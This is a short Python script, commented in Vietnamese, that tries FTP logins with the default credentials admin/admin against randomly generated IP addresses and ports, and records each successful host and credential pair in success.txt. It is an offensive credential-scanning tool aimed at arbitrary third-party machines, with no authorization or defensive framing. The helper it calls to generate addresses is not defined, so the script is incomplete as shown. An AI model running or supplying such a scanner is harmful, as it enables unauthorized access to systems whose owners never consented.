from ftplib import FTP

def try_login_ftp(ip, port, username, password):
    try:
        ftp = FTP()
        ftp.connect(ip, port)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception as e:
        return False

def main():
    # Lặp qua một loạt các IP và port ngẫu nhiên
    for _ in range(10):
        ip, port = generate_random_ip_port()
        username = "admin"
        password = "admin"

        if try_login_ftp(ip, port, username, password):
            with open("success.txt", "a") as file:
                file.write(f"IP: {ip}, Port: {port}, Username: {username}, Password: {password}\n")
            print(f"Logged in successfully to {ip}:{port} with {username}/{password}")
        else:
            print(f"Failed to login to {ip}:{port} with {username}/{password}")

if __name__ == "__main__":
    main()
